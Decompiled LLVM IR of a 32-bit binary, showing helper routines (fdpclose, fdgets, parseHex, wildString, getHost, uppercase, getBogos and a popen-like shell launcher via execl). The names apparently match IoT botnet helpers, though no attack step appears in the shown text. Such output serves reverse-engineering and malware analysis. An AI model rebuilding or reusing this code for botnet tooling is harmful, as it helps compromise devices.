dec_label_pc_8048acb:                             ; preds = %dec_label_pc_8048ac4
  %v2_8048ad4 = call i32 @dup2(i32 %v3_8048ac4, i32 0)
  %v3_8048adc = load i32, i32* %stack_var_-24, align 4
  %v1_8048ae3 = call i32 @__libc_close(i32 %v3_8048adc)
  br label %dec_label_pc_8048aeb

dec_label_pc_8048aeb:                             ; preds = %dec_label_pc_8048ac4.dec_label_pc_8048aeb_crit_edge, %dec_label_pc_8048acb
  %v1_8048af2 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048afa

dec_label_pc_8048afa:                             ; preds = %dec_label_pc_8048ab3, %dec_label_pc_8048aeb
  %v8_8048b11 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805254f.22 to i32), i32 ptrtoint ([3 x i8]* @global_var_805254c.21 to i32), i32 ptrtoint ([3 x i8]* @global_var_8052549.20 to i32), i32 %tmp18, i32 0)
  %v1_8048b1e = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048b23:                             ; preds = %dec_label_pc_8048a4d
  br i1 %v1_8048a89, label %dec_label_pc_8048b43, label %dec_label_pc_8048b2c

dec_label_pc_8048b2c:                             ; preds = %dec_label_pc_8048b23
  %v3_8048b2c = load i32, i32* %stack_var_-24, align 4
  %v2_8048b39 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048b58

dec_label_pc_8048b43:                             ; preds = %dec_label_pc_8048b23
  %v3_8048b49 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b50 = call i32 @__libc_close(i32 %v3_8048b49)
  br label %dec_label_pc_8048b58

dec_label_pc_8048b58:                             ; preds = %dec_label_pc_8048b2c, %dec_label_pc_8048b43
  %stack_var_-28.0 = phi i32 [ %v3_8048b2c, %dec_label_pc_8048b2c ], [ %tmp19, %dec_label_pc_8048b43 ]
  %v2_8048b5b = mul i32 %stack_var_-28.0, 4
  %v0_8048b60 = load i8*, i8** @global_var_8059440.19, align 4
  %v1_8048b60 = ptrtoint i8* %v0_8048b60 to i32
  %v2_8048b65 = add i32 %v1_8048b60, %v2_8048b5b
  %v2_8048b6a = inttoptr i32 %v2_8048b65 to i32*
  store i32 %v0_8048a39, i32* %v2_8048b6a, align 4
  br label %dec_label_pc_8048b72

dec_label_pc_8048b72:                             ; preds = %dec_label_pc_80489f5, %dec_label_pc_80489db, %dec_label_pc_80489b3, %dec_label_pc_8048994, %dec_label_pc_804899d, %dec_label_pc_8048a58, %dec_label_pc_8048b58
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048a58 ], [ %stack_var_-28.0, %dec_label_pc_8048b58 ], [ -1, %dec_label_pc_804899d ], [ -1, %dec_label_pc_8048994 ], [ -1, %dec_label_pc_80489b3 ], [ -1, %dec_label_pc_80489db ], [ -1, %dec_label_pc_80489f5 ]
  %v3_8048b75 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048b75, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_8048a39, { 1, 2, 0 }
  uselistorder i32 %v1_80489ff, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80489db, { 2, 0, 1 }
  uselistorder i8* %tmp24, { 0, 1, 3, 2 }
  uselistorder i32 %tmp19, { 1, 6, 3, 4, 5, 0, 2 }
  uselistorder label %dec_label_pc_8048b72, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048b58, { 1, 0 }
  uselistorder label %dec_label_pc_8048afa, { 1, 0 }
  uselistorder label %dec_label_pc_8048aeb, { 1, 0 }
  uselistorder label %dec_label_pc_8048ab3, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048b7a = load i32, i32* @ebp, align 4
  store i32 %v0_8048b7a, i32* %stack_var_-4, align 4
  %v0_8048b83 = load i8*, i8** @global_var_8059440.19, align 4
  %v2_8048b88 = icmp eq i8* %v0_8048b83, null
  br i1 %v2_8048b88, label %dec_label_pc_8048cd6, label %dec_label_pc_8048b8c

dec_label_pc_8048b8c:                             ; preds = %entry
  %v1_8048b83 = ptrtoint i8* %v0_8048b83 to i32
  %v2_8048b8f = mul i32 %tmp11, 4
  %v2_8048b99 = add i32 %v1_8048b83, %v2_8048b8f
  %v1_8048b9c = inttoptr i32 %v2_8048b99 to i32*
  %v2_8048b9c = load i32, i32* %v1_8048b9c, align 4
  %v1_8048b9e = icmp eq i32 %v2_8048b9c, 0
  %v1_8048ba0 = icmp eq i1 %v1_8048b9e, false
  br i1 %v1_8048ba0, label %dec_label_pc_8048bb1, label %dec_label_pc_8048cd6

dec_label_pc_8048bb1:                             ; preds = %dec_label_pc_8048b8c
  %v1_8048bb7 = call i32 @__libc_close(i32 %tmp11)
  %v2_8048bc2 = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048bc9 = call i32 @sigemptyset(i32 %v2_8048bc2)
  %v2_8048bdd = call i32 @__GI_sigaddset(i32 %v2_8048bc2, i32 2)
  %v2_8048bf1 = call i32 @__GI_sigaddset(i32 %v2_8048bc2, i32 3)
  %v2_8048c05 = call i32 @__GI_sigaddset(i32 %v2_8048bc2, i32 1)
  %v2_8048c10 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048c20 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048c20 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048c20, i32 %v2_8048c10)
  %v2_8048c3f = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c5e, %dec_label_pc_8048bb1
  %v0_8048c30 = load i8*, i8** @global_var_8059440.19, align 4
  %v1_8048c30 = ptrtoint i8* %v0_8048c30 to i32
  %v2_8048c35 = add i32 %v1_8048c30, %v2_8048b8f
  %v1_8048c38 = inttoptr i32 %v2_8048c35 to i32*
  %v2_8048c38 = load i32, i32* %v1_8048c38, align 4
  %v3_8048c47 = call i32 @__libc_waitpid(i32 %v2_8048c38, i32 %v2_8048c3f, i32 0)
  %v13_8048c55 = icmp eq i32 %v3_8048c47, -1
  %v1_8048c5c = icmp eq i1 %v13_8048c55, false
  br i1 %v1_8048c5c, label %dec_label_pc_8048c6a, label %dec_label_pc_8048c5e

dec_label_pc_8048c5e:                             ; preds = %dec_label_pc_8048c28
  %v1_8048c5e = call i32 @__errno_location(i32 %v3_8048c47)
  %v1_8048c63 = inttoptr i32 %v1_8048c5e to i32*
  %v2_8048c63 = load i32, i32* %v1_8048c63, align 4
  %v9_8048c65 = icmp eq i32 %v2_8048c63, 4
  br i1 %v9_8048c65, label %dec_label_pc_8048c28, label %dec_label_pc_8048c6a

dec_label_pc_8048c6a:                             ; preds = %dec_label_pc_8048c5e, %dec_label_pc_8048c28
  %v13_8048c55.lcssa = phi i1 [ true, %dec_label_pc_8048c5e ], [ false, %dec_label_pc_8048c28 ]
  %v3_8048c78 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048c78 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048c78, i32 0)
  %v2_8048c86 = mul i32 %tmp8, 4
  %v0_8048c8b = load i8*, i8** @global_var_8059440.19, align 4
  %v1_8048c8b = ptrtoint i8* %v0_8048c8b to i32
  %v2_8048c90 = add i32 %v1_8048c8b, %v2_8048c86
  %v1_8048c93 = inttoptr i32 %v2_8048c90 to i32*
  store i32 0, i32* %v1_8048c93, align 4
  br i1 %v13_8048c55.lcssa, label %dec_label_pc_8048cca, label %dec_label_pc_8048ca2

dec_label_pc_8048ca2:                             ; preds = %dec_label_pc_8048c6a
  %v3_8048ca2 = load i32, i32* %stack_var_-268, align 4
  %v1_8048cae = and i32 %v3_8048ca2, 65280
  %v2_8048cb51 = udiv i32 %v1_8048cae, 256
  br label %dec_label_pc_8048cca

dec_label_pc_8048cca:                             ; preds = %dec_label_pc_8048c6a, %dec_label_pc_8048ca2
  %storemerge2 = phi i32 [ %v2_8048cb51, %dec_label_pc_8048ca2 ], [ -1, %dec_label_pc_8048c6a ]
  %v2_8048cdc.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048cd6

dec_label_pc_8048cd6:                             ; preds = %entry, %dec_label_pc_8048b8c, %dec_label_pc_8048cca
  %v2_8048cdc = phi i32 [ %v2_8048cdc.pre, %dec_label_pc_8048cca ], [ %v0_8048b7a, %dec_label_pc_8048b8c ], [ %v0_8048b7a, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048cca ], [ -1, %dec_label_pc_8048b8c ], [ -1, %entry ]
  store i32 %v2_8048cdc, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048c47, { 1, 0 }
  uselistorder i32 %v2_8048b8f, { 1, 0 }
  uselistorder i8* %v0_8048b83, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_8059440.19, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048cd6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048cca, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048d17

dec_label_pc_8048cf4:                             ; preds = %dec_label_pc_8048d1f
  %v3_8048d03 = inttoptr i32 %v5_8048d22 to i32*
  %v4_8048d03 = call i32 @__libc_read(i32 %arg3, i32* %v3_8048d03, i32 1)
  %v4_8048d0e = add nuw i32 %storemerge115, 1
  %v8_8048d11 = icmp eq i32 %v4_8048d03, 0
  %v12_8048d11 = icmp eq i32 %v4_8048d03, 1
  %v1_8048d15 = icmp eq i1 %v12_8048d11, false
  br i1 %v1_8048d15, label %dec_label_pc_8048d2c, label %dec_label_pc_8048d17

dec_label_pc_8048d17:                             ; preds = %entry, %dec_label_pc_8048cf4
  %v8_8048d1116 = phi i1 [ false, %entry ], [ %v8_8048d11, %dec_label_pc_8048cf4 ]
  %storemerge115 = phi i32 [ 0, %entry ], [ %v4_8048d0e, %dec_label_pc_8048cf4 ]
  %v5_8048d1d = icmp slt i32 %storemerge115, %arg2
  br i1 %v5_8048d1d, label %dec_label_pc_8048d1f, label %dec_label_pc_8048d2c

dec_label_pc_8048d1f:                             ; preds = %dec_label_pc_8048d17
  %v5_8048d22 = add i32 %storemerge115, %arg1
  %v1_8048d25 = add i32 %v5_8048d22, -1
  %v1_8048d26 = inttoptr i32 %v1_8048d25 to i8*
  %v2_8048d26 = load i8, i8* %v1_8048d26, align 1
  %v10_8048d28 = icmp eq i8 %v2_8048d26, 10
  %v1_8048d2a = icmp eq i1 %v10_8048d28, false
  br i1 %v1_8048d2a, label %dec_label_pc_8048cf4, label %dec_label_pc_8048d2c

dec_label_pc_8048d2c:                             ; preds = %dec_label_pc_8048d17, %dec_label_pc_8048d1f, %dec_label_pc_8048cf4
  %v8_8048d11.lcssa = phi i1 [ %v8_8048d1116, %dec_label_pc_8048d17 ], [ %v8_8048d1116, %dec_label_pc_8048d1f ], [ %v8_8048d11, %dec_label_pc_8048cf4 ]
  br i1 %v8_8048d11.lcssa, label %dec_label_pc_8048d41, label %dec_label_pc_8048d32

dec_label_pc_8048d32:                             ; preds = %dec_label_pc_8048d2c
  br label %dec_label_pc_8048d41

dec_label_pc_8048d41:                             ; preds = %dec_label_pc_8048d2c, %dec_label_pc_8048d32
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048d32 ], [ 0, %dec_label_pc_8048d2c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048d22, { 1, 0 }
  uselistorder i32 %storemerge115, { 2, 0, 1 }
  uselistorder i1 %v8_8048d1116, { 1, 0 }
  uselistorder i1 %v8_8048d11, { 1, 0 }
  uselistorder i32 %v4_8048d03, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d41, { 1, 0 }
  uselistorder label %dec_label_pc_8048d2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d17, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048d765 = ptrtoint i8* %arg1 to i32
  %v2_8048d796 = load i8, i8* %arg1, align 1
  %v4_8048d7b10 = icmp eq i8 %v2_8048d796, 0
  br i1 %v4_8048d7b10, label %dec_label_pc_8048d85, label %dec_label_pc_8048d7f

dec_label_pc_8048d55:                             ; preds = %dec_label_pc_8048d7f
  %v2_8048d5a = mul i32 %stack_var_-8.011, 16
  %v2_8048d60 = load i8, i8* %stack_var_4.012, align 1
  %v3_8048d60 = zext i8 %v2_8048d60 to i32
  %v1_8048d67 = mul nuw nsw i32 %v3_8048d60, 4
  %v2_8048d67 = add i32 %v1_8048d67, ptrtoint (i32* @global_var_8052560.23 to i32)
  %v3_8048d67 = inttoptr i32 %v2_8048d67 to i32*
  %v4_8048d67 = load i32, i32* %v3_8048d67, align 4
  %v2_8048d6e = or i32 %v4_8048d67, %v2_8048d5a
  %v5_8048d73 = add i32 %v4_8048d7613, 1
  %v22_8048d73 = inttoptr i32 %v5_8048d73 to i8*
  %v2_8048d79 = load i8, i8* %v22_8048d73, align 1
  %v4_8048d7b = icmp eq i8 %v2_8048d79, 0
  br i1 %v4_8048d7b, label %dec_label_pc_8048d85, label %dec_label_pc_8048d7f

dec_label_pc_8048d7f:                             ; preds = %entry, %dec_label_pc_8048d55
  %v4_8048d7613 = phi i32 [ %v5_8048d73, %dec_label_pc_8048d55 ], [ %v4_8048d765, %entry ]
  %stack_var_4.012 = phi i8* [ %v22_8048d73, %dec_label_pc_8048d55 ], [ %arg1, %entry ]
  %stack_var_-8.011 = phi i32 [ %v2_8048d6e, %dec_label_pc_8048d55 ], [ 0, %entry ]
  %v5_8048d7f = icmp slt i32 %stack_var_-8.011, 0
  %v1_8048d83 = icmp eq i1 %v5_8048d7f, false
  br i1 %v1_8048d83, label %dec_label_pc_8048d55, label %dec_label_pc_8048d85

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d55, %dec_label_pc_8048d7f, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-8.011, %dec_label_pc_8048d7f ], [ %v2_8048d6e, %dec_label_pc_8048d55 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.011, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048d85, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d7f, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048d8d = load i32, i32* @ebx, align 4
  store i32 %v0_8048d8d, i32* %stack_var_-8, align 4
  %v4_8048d91 = ptrtoint i8* %arg1 to i32
  %v2_8048d94 = load i8, i8* %arg1, align 1
  %v12_8048da0 = icmp eq i8 %v2_8048d94, 42
  br i1 %v12_8048da0, label %dec_label_pc_8048dcb, label %dec_label_pc_8048da6

dec_label_pc_8048da6:                             ; preds = %entry
  %v12_8048da6 = icmp eq i8 %v2_8048d94, 63
  br i1 %v12_8048da6, label %dec_label_pc_8048e1d, label %dec_label_pc_8048dac

dec_label_pc_8048dac:                             ; preds = %dec_label_pc_8048da6
  %v4_8048dac = icmp eq i8 %v2_8048d94, 0
  br i1 %v4_8048dac, label %dec_label_pc_8048db7, label %dec_label_pc_8048e57

dec_label_pc_8048db7:                             ; preds = %dec_label_pc_8048dac
  %v2_8048dba = load i8, i8* %tmp13, align 1
  %v3_8048dba = zext i8 %v2_8048dba to i32
  br label %dec_label_pc_8048eb8

dec_label_pc_8048dcb:                             ; preds = %entry
  %v1_8048dce = add i32 %v4_8048d91, 1
  %v5_8048dd5 = inttoptr i32 %v1_8048dce to i8*
  %v5_8048dd6 = call i32 @wildString(i8* %v5_8048dd5, i32 %arg2)
  %v1_8048dde = icmp eq i32 %v5_8048dd6, 0
  br i1 %v1_8048dde, label %dec_label_pc_8048e0b, label %dec_label_pc_8048de2

dec_label_pc_8048de2:                             ; preds = %dec_label_pc_8048dcb
  %v2_8048de5 = load i8, i8* %tmp13, align 1
  %v4_8048de7 = icmp eq i8 %v2_8048de5, 0
  br i1 %v4_8048de7, label %dec_label_pc_8048e12, label %dec_label_pc_8048deb

dec_label_pc_8048deb:                             ; preds = %dec_label_pc_8048de2
  %v1_8048dee = add i32 %arg2, 1
  %v5_8048df6 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048dee)
  %v1_8048dfe = icmp eq i32 %v5_8048df6, 0
  br i1 %v1_8048dfe, label %dec_label_pc_8048e0b, label %dec_label_pc_8048e12

dec_label_pc_8048e0b:                             ; preds = %dec_label_pc_8048deb, %dec_label_pc_8048dcb
  br label %dec_label_pc_8048e12

dec_label_pc_8048e12:                             ; preds = %dec_label_pc_8048de2, %dec_label_pc_8048deb, %dec_label_pc_8048e0b
  %storemerge7 = phi i32 [ 0, %dec_label_pc_8048e0b ], [ 1, %dec_label_pc_8048deb ], [ 1, %dec_label_pc_8048de2 ]
  br label %dec_label_pc_8048eb8

dec_label_pc_8048e1d:                             ; preds = %dec_label_pc_8048da6
  %v2_8048e20 = load i8, i8* %tmp13, align 1
  %v4_8048e22 = icmp eq i8 %v2_8048e20, 0
  br i1 %v4_8048e22, label %dec_label_pc_8048e4f, label %dec_label_pc_8048e26

dec_label_pc_8048e26:                             ; preds = %dec_label_pc_8048e1d
  %v1_8048e29 = add i32 %arg2, 1
  %v1_8048e2d = add i32 %v4_8048d91, 1
  %v5_8048e32 = inttoptr i32 %v1_8048e2d to i8*
  %v5_8048e33 = call i32 @wildString(i8* %v5_8048e32, i32 %v1_8048e29)
  %v1_8048e3b = icmp ne i32 %v5_8048e33, 0
  %. = zext i1 %v1_8048e3b to i32
  br label %dec_label_pc_8048e4f

dec_label_pc_8048e4f:                             ; preds = %dec_label_pc_8048e26, %dec_label_pc_8048e1d
  %storemerge4 = phi i32 [ 1, %dec_label_pc_8048e1d ], [ %., %dec_label_pc_8048e26 ]
  br label %dec_label_pc_8048eb8

dec_label_pc_8048e57:                             ; preds = %dec_label_pc_8048dac
  %v2_8048e5a = load i8, i8* %arg1, align 1
  %v3_8048e5a = zext i8 %v2_8048e5a to i32
  %v2_8048e65 = call i32 @__GI_toupper(i32 %v3_8048e5a)
  store i32 %v2_8048e65, i32* @ebx, align 4
  %v2_8048e72 = load i8, i8* %tmp13, align 1
  %v3_8048e72 = zext i8 %v2_8048e72 to i32
  %v2_8048e7d = call i32 @__GI_toupper(i32 %v3_8048e72)
  %v0_8048e85 = load i32, i32* @ebx, align 4
  %v12_8048e85 = icmp eq i32 %v0_8048e85, %v2_8048e7d
  %v1_8048e87 = icmp eq i1 %v12_8048e85, false
  br i1 %v1_8048e87, label %dec_label_pc_8048eb2, label %dec_label_pc_8048e89

dec_label_pc_8048e89:                             ; preds = %dec_label_pc_8048e57
  %v1_8048e8c = add i32 %arg2, 1
  %v1_8048e90 = add i32 %v4_8048d91, 1
  %v5_8048e95 = inttoptr i32 %v1_8048e90 to i8*
  %v5_8048e96 = call i32 @wildString(i8* %v5_8048e95, i32 %v1_8048e8c)
  %v1_8048e9e = icmp ne i32 %v5_8048e96, 0
  %.8 = zext i1 %v1_8048e9e to i32
  br label %dec_label_pc_8048eb2

dec_label_pc_8048eb2:                             ; preds = %dec_label_pc_8048e89, %dec_label_pc_8048e57
  %storemerge = phi i32 [ 1, %dec_label_pc_8048e57 ], [ %.8, %dec_label_pc_8048e89 ]
  br label %dec_label_pc_8048eb8

dec_label_pc_8048eb8:                             ; preds = %dec_label_pc_8048e4f, %dec_label_pc_8048e12, %dec_label_pc_8048db7, %dec_label_pc_8048eb2
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_8048e12 ], [ %storemerge4, %dec_label_pc_8048e4f ], [ %v3_8048dba, %dec_label_pc_8048db7 ], [ %storemerge, %dec_label_pc_8048eb2 ]
  %v3_8048ebb = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048ebb, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048d94, { 2, 0, 1 }
  uselistorder i32 %v4_8048d91, { 0, 2, 1 }
  uselistorder i8* %tmp13, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048eb8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048e12, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8048ecd = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048ecd, i32* %arg2, align 4
  %v10_8048ee1 = icmp eq i32 %v1_8048ecd, -1
  %. = zext i1 %v10_8048ee1 to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048efb = load i32, i32* @ebp, align 4
  store i32 %v0_8048efb, i32* %stack_var_-4, align 4
  %v4_8048f236 = ptrtoint i8* %arg1 to i32
  %v2_8048f267 = load i8, i8* %arg1, align 1
  %v3_8048f268 = zext i8 %v2_8048f267 to i32
  %v5_8048f269 = and i32 %v4_8048f236, -256
  %v6_8048f2610 = or i32 %v3_8048f268, %v5_8048f269
  %v4_8048f2811 = icmp eq i8 %v2_8048f267, 0
  %v1_8048f2a12 = icmp eq i1 %v4_8048f2811, false
  br i1 %v1_8048f2a12, label %dec_label_pc_8048f03, label %dec_label_pc_8048f2c

dec_label_pc_8048f03:                             ; preds = %entry, %dec_label_pc_8048f03.dec_label_pc_8048f03_crit_edge
  %v4_8048f2314 = phi i32 [ %v5_8048f20, %dec_label_pc_8048f03.dec_label_pc_8048f03_crit_edge ], [ %v4_8048f236, %entry ]
  %stack_var_4.013 = phi i8* [ %v22_8048f20, %dec_label_pc_8048f03.dec_label_pc_8048f03_crit_edge ], [ %arg1, %entry ]
  %v2_8048f06 = load i8, i8* %stack_var_4.013, align 1
  %v3_8048f06 = zext i8 %v2_8048f06 to i32
  %v1_8048f11 = call i32 @__GI_toupper(i32 %v3_8048f06)
  %v1_8048f1e = trunc i32 %v1_8048f11 to i8
  store i8 %v1_8048f1e, i8* %stack_var_4.013, align 1
  %v5_8048f20 = add i32 %v4_8048f2314, 1
  %v22_8048f20 = inttoptr i32 %v5_8048f20 to i8*
  %v2_8048f26 = load i8, i8* %v22_8048f20, align 1
  %v4_8048f28 = icmp eq i8 %v2_8048f26, 0
  %v1_8048f2a = icmp eq i1 %v4_8048f28, false
  br i1 %v1_8048f2a, label %dec_label_pc_8048f03.dec_label_pc_8048f03_crit_edge, label %dec_label_pc_8048f23.dec_label_pc_8048f2c_crit_edge

dec_label_pc_8048f03.dec_label_pc_8048f03_crit_edge: ; preds = %dec_label_pc_8048f03
  br label %dec_label_pc_8048f03

dec_label_pc_8048f23.dec_label_pc_8048f2c_crit_edge: ; preds = %dec_label_pc_8048f03
  %v3_8048f26 = zext i8 %v2_8048f26 to i32
  %v5_8048f26 = and i32 %v5_8048f20, -256
  %v6_8048f26 = or i32 %v3_8048f26, %v5_8048f26
  %v2_8048f2c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048f2c

dec_label_pc_8048f2c:                             ; preds = %dec_label_pc_8048f23.dec_label_pc_8048f2c_crit_edge, %entry
  %v2_8048f2c = phi i32 [ %v2_8048f2c.pre, %dec_label_pc_8048f23.dec_label_pc_8048f2c_crit_edge ], [ %v0_8048efb, %entry ]
  %v6_8048f26.lcssa = phi i32 [ %v6_8048f26, %dec_label_pc_8048f23.dec_label_pc_8048f2c_crit_edge ], [ %v6_8048f2610, %entry ]
  store i32 %v2_8048f2c, i32* @ebp, align 4
  ret i32 %v6_8048f26.lcssa

; uselistorder directives
  uselistorder i8 %v2_8048f26, { 1, 0 }
  uselistorder i8* %v22_8048f20, { 1, 0 }
  uselistorder i32 %v5_8048f20, { 1, 2, 0 }
  uselistorder i8* %stack_var_4.013, { 1, 0 }
  uselistorder label %dec_label_pc_8048f03, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048f42 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8052960.24, i32 0, i32 0), i32 0)
  %v2_80490a0 = ptrtoint i32* %stack_var_-4112 to i32
  %tmp34 = bitcast i32* %stack_var_-4112 to i8*
  %v5_80490b237 = call i32 @fdgets(i32 %v2_80490a0, i32 4096, i32 %v5_8048f42)
  %v1_80490ba38 = icmp eq i32 %v5_80490b237, 0
  %v1_80490bc39 = icmp eq i1 %v1_80490ba38, false
  br i1 %v1_80490bc39, label %dec_label_pc_8048f52.lr.ph, label %dec_label_pc_80490c2

dec_label_pc_8048f52.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8048f52

dec_label_pc_8048f52:                             ; preds = %dec_label_pc_8048f52.lr.ph, %dec_label_pc_8049084
  %v3_8048f5c = call i32 @uppercase(i8* %tmp34)
  %v5_8048f73 = call i32 @strstr(i32 %v2_80490a0, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805296e.25, i32 0, i32 0))
  %v12_8048f83 = icmp eq i32 %v5_8048f73, %v2_80490a0
  %v1_8048f85 = icmp eq i1 %v12_8048f83, false
  br i1 %v1_8048f85, label %dec_label_pc_8049084, label %dec_label_pc_8048f8b

dec_label_pc_8048f8b:                             ; preds = %dec_label_pc_8048f52
  %tmp35 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048f9c

dec_label_pc_8048f99:                             ; preds = %dec_label_pc_8048fae, %dec_label_pc_8048fa5, %dec_label_pc_8048f9c
  %v5_8048f99 = add i32 %v4_8048f9c, 1
  %v22_8048f99 = inttoptr i32 %v5_8048f99 to i8*
  br label %dec_label_pc_8048f9c

dec_label_pc_8048f9c:                             ; preds = %dec_label_pc_8048f8b, %dec_label_pc_8048f99
  %storemerge4 = phi i8* [ %v22_8048f99, %dec_label_pc_8048f99 ], [ %tmp35, %dec_label_pc_8048f8b ]
  %v4_8048f9c = ptrtoint i8* %storemerge4 to i32
  %v2_8048f9f = load i8, i8* %storemerge4, align 1
  %v7_8048fa1 = icmp eq i8 %v2_8048f9f, 32
  br i1 %v7_8048fa1, label %dec_label_pc_8048f99, label %dec_label_pc_8048fa5

dec_label_pc_8048fa5:                             ; preds = %dec_label_pc_8048f9c
  %v2_8048fa8 = load i8, i8* %storemerge4, align 1
  %v10_8048faa = icmp eq i8 %v2_8048fa8, 9
  br i1 %v10_8048faa, label %dec_label_pc_8048f99, label %dec_label_pc_8048fae

dec_label_pc_8048fae:                             ; preds = %dec_label_pc_8048fa5
  %v2_8048fb1 = load i8, i8* %storemerge4, align 1
  %v10_8048fb3 = icmp eq i8 %v2_8048fb1, 58
  br i1 %v10_8048fb3, label %dec_label_pc_8048f99, label %dec_label_pc_8048fde

dec_label_pc_8048fb9:                             ; preds = %dec_label_pc_8049006, %dec_label_pc_8048fde
  %v3_8048fd0 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048fd7 = add i32 %v4_8048f9c, %v3_8048fd0
  %v1_8048fda = add i32 %v6_8048fd7, -1
  %v1_8048fdb = inttoptr i32 %v1_8048fda to i8*
  store i8 0, i8* %v1_8048fdb, align 1
  br label %dec_label_pc_8048fde

dec_label_pc_8048fde:                             ; preds = %dec_label_pc_8048fae, %dec_label_pc_8048fb9
  %v3_8048ff5 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048ffc = add i32 %v4_8048f9c, %v3_8048ff5
  %v1_8048fff = add i32 %v6_8048ffc, -1
  %v1_8049000 = inttoptr i32 %v1_8048fff to i8*
  %v2_8049000 = load i8, i8* %v1_8049000, align 1
  %v10_8049002 = icmp eq i8 %v2_8049000, 13
  br i1 %v10_8049002, label %dec_label_pc_8048fb9, label %dec_label_pc_8049006

dec_label_pc_8049006:                             ; preds = %dec_label_pc_8048fde
  store i32 %v4_8048f9c, i32* @edi, align 4
  %v3_804901d = call i32 @_strlen(i8* %storemerge4)
  %v6_8049024 = add i32 %v4_8048f9c, %v3_804901d
  %v1_8049027 = add i32 %v6_8049024, -1
  %v1_8049028 = inttoptr i32 %v1_8049027 to i8*
  %v2_8049028 = load i8, i8* %v1_8049028, align 1
  %v10_804902a = icmp eq i8 %v2_8049028, 10
  br i1 %v10_804902a, label %dec_label_pc_8048fb9, label %dec_label_pc_804902e

dec_label_pc_804902e:                             ; preds = %dec_label_pc_8049006
  %v5_8049037 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_804903f = icmp eq i32 %v5_8049037, 0
  br i1 %v1_804903f, label %dec_label_pc_8049057, label %dec_label_pc_8049043

dec_label_pc_8049043:                             ; preds = %dec_label_pc_804902e
  %v5_804904c = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_804904c = inttoptr i32 %v5_804904c to i8*
  store i8 0, i8* %v6_804904c, align 1
